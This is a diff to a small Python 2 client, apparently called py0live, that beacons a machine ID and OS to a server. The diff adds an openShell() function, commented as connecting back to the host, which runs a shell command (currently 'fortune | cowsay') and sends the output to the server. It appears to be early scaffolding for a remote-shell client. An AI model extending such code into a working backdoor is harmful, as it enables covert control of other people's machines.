@@ -4,8 +4,9 @@ import os
 import uuid
 import time 
 import traceback
+import subprocess
 
-VERSION = '0.1'
+VERSION = '0.1.1'
 
 def send(status, data):
 
@@ -26,9 +27,15 @@ def send(status, data):
 
 	server_responce = s.recv(BUFFER_SIZE)
 
-	s.close()
+	#s.close()
 
 	print "Server responce: ", server_responce
+	# Testing server keep alive
+	s.send('hello1')
+	time.sleep(1)
+	s.send('hello2')
+
+			
 
 def getID():
 
@@ -48,13 +55,19 @@ def getOS():
 	except:
 		return -1
 
+def openShell():
+	# Opens a shell and connects back to host.
+	proc2 = subprocess.Popen('fortune | cowsay', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	stdout_value = proc2.stdout.read() + proc2.stderr.read()
+	args = stdout_value 
+	server_SHELL(args)
 
 def timeNow():
 	return int(round(time.time() * 1000))
 
 def protocolFromat(status, data):
 	# See py0live_protocol_documentation.txt
-	protocol = "%s:%s:%s:%s:%s:%s" % (timeNow(), getID(), VERSION, 1, status, data)
+	protocol = "%s:%s:%s:%s:%s:%s" % (timeNow(), getID(), VERSION, 'c', status, data)
 	return str(protocol)
 
 def server_HANDSHAKE():
@@ -65,12 +78,8 @@ def sever_HEARTBEAT():
 	# See py0live_protocol_documentation.txt
 	send('100', '0')
 
-server_HANDSHAKE()
-	
-while 1:
-	try: 
-		sever_HEARTBEAT()
-		time.sleep(1)
-	except KeyboardInterrupt:
-		print 'KeyboardInterrupt' 
-		exit()
+def server_SHELL(shell):
+	# See py0live_protocol_documentation.txt
+	send('66', shell)
+
+
